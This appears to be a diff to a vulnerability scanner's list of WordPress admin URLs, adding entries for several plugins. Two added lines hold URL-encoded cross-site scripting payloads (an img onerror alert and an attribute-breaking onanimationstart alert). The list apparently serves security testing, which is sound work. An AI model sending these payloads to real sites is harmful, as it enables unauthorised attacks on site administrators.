@@ -198,3 +198,6 @@
 /wp-admin/edit.php?post_type=download&page=edd-payment-history&payment%5B0%5D=1&payment%5B1%5D=2&action=delete
 /wp-admin/admin.php?page=simple_wp_membership_payments&action=delete_txn&id=1
 /wp-admin/admin-ajax.php?action=eventon&eid=
+/wp-admin/admin-ajax.php?action=fts_encrypt_token_ajax&access_token=%3Cimg%20src=x%20onerror=alert(/XSS/)%3E
+/wp-admin/admin.php?page=tiempocom%2Fapp%2Fadmin.php&action=new
+/wp-admin/admin.php?page=watu_exams&title=%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28%2FXSS%2F%29%2F%2F
